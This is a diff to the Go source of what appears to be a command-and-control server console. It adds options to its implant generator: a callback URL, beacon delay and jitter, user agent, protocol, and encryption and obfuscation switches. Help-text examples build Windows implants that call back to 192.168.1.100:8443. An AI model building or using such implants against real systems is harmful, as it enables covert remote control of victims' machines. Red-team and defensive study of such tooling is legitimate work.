@@ -123,10 +123,15 @@ Available Commands:
                                Example: listen http 0.0.0.0:8080
     kill, k <job_id>           Stop a job by ID
     
-  Implant Generation:
-    generate, gen, g           Generate implant
-                               Usage: generate <type> <os> <arch> [output_path]
-                               Example: generate stager windows amd64 /tmp/implant.exe
+         Implant Generation:
+           generate, gen, g           Generate implant
+                                      Usage: generate <type> <os> <arch> [options]
+                                      Options:
+                                        --callback, -c <url>     Callback URL (http://host:port)
+                                        --delay, -d <sec>        Beacon delay (default: 30)
+                                        --jitter, -j <0.0-1.0>   Jitter percentage
+                                        --output, -o <path>      Output file path
+                                      Example: generate full windows amd64 --callback http://192.168.1.100:8443
                                
   Session Management:
     sessions, sess             List all active sessions
@@ -243,11 +248,25 @@ func (is *InteractiveServer) handleKill(args []string) error {
 
 func (is *InteractiveServer) handleGenerate(args []string) error {
 	if len(args) < 3 {
-		fmt.Println("[!] Usage: generate <type> <os> <arch> [output_path]")
+		fmt.Println("[!] Usage: generate <type> <os> <arch> [options]")
 		fmt.Println("    Types: stager, shellcode, full")
 		fmt.Println("    OS: linux, windows, darwin")
 		fmt.Println("    Arch: amd64, 386, arm64")
-		fmt.Println("    Example: generate stager windows amd64 /tmp/implant.exe")
+		fmt.Println("")
+		fmt.Println("    Options:")
+		fmt.Println("      --output, -o <path>      Output file path")
+		fmt.Println("      --callback, -c <url>     Callback URL (http://host:port or https://host:port)")
+		fmt.Println("      --delay, -d <seconds>    Beacon delay in seconds (default: 30)")
+		fmt.Println("      --jitter, -j <0.0-1.0>   Jitter percentage (default: 0.0)")
+		fmt.Println("      --user-agent, -u <ua>    Custom user agent string")
+		fmt.Println("      --protocol, -p <proto>   Protocol: http, https, mtls (default: http)")
+		fmt.Println("      --no-encrypt            Disable encryption")
+		fmt.Println("      --no-obfuscate          Disable obfuscation")
+		fmt.Println("")
+		fmt.Println("    Examples:")
+		fmt.Println("      generate full windows amd64 --callback http://192.168.1.100:8443")
+		fmt.Println("      generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443")
+		fmt.Println("      generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3")
 		return nil
 	}
 
@@ -255,11 +274,57 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 	osTarget := args[1]
 	arch := args[2]
 	
+	// Parse flags
 	var outputPath string
-	if len(args) > 3 {
-		outputPath = args[3]
-	} else {
-		// Default output directory
+	var callbackURL string
+	var delay int
+	var jitter float64
+	var userAgent string
+	var protocol string
+	encrypt := true
+	obfuscate := true
+	
+	for i := 3; i < len(args); i++ {
+		switch args[i] {
+		case "--output", "-o":
+			if i+1 < len(args) {
+				outputPath = args[i+1]
+				i++
+			}
+		case "--callback", "-c":
+			if i+1 < len(args) {
+				callbackURL = args[i+1]
+				i++
+			}
+		case "--delay", "-d":
+			if i+1 < len(args) {
+				fmt.Sscanf(args[i+1], "%d", &delay)
+				i++
+			}
+		case "--jitter", "-j":
+			if i+1 < len(args) {
+				fmt.Sscanf(args[i+1], "%f", &jitter)
+				i++
+			}
+		case "--user-agent", "-u":
+			if i+1 < len(args) {
+				userAgent = args[i+1]
+				i++
+			}
+		case "--protocol", "-p":
+			if i+1 < len(args) {
+				protocol = args[i+1]
+				i++
+			}
+		case "--no-encrypt":
+			encrypt = false
+		case "--no-obfuscate":
+			obfuscate = false
+		}
+	}
+	
+	// Set default output path if not provided
+	if outputPath == "" {
 		outputDir := "./implants"
 		os.MkdirAll(outputDir, 0755)
 		
@@ -273,15 +338,29 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 	}
 
 	fmt.Printf("[*] Generating %s payload for %s/%s...\n", payloadType, osTarget, arch)
+	if callbackURL != "" {
+		fmt.Printf("[*] Callback URL: %s\n", callbackURL)
+	}
+	if delay > 0 {
+		fmt.Printf("[*] Delay: %d seconds\n", delay)
+	}
+	if jitter > 0 {
+		fmt.Printf("[*] Jitter: %.1f%%\n", jitter*100)
+	}
 	fmt.Printf("[*] Output: %s\n", outputPath)
 
 	options := payload.Options{
-		Type:      payloadType,
-		Arch:      arch,
-		OS:        osTarget,
-		Encrypt:   true,
-		Obfuscate: true,
-		Config:    is.config,
+		Type:        payloadType,
+		Arch:        arch,
+		OS:          osTarget,
+		Encrypt:     encrypt,
+		Obfuscate:   obfuscate,
+		Config:      is.config,
+		CallbackURL: callbackURL,
+		Delay:       delay,
+		Jitter:      jitter,
+		UserAgent:   userAgent,
+		Protocol:    protocol,
 	}
 
 	gen := payload.NewGenerator(is.logger)
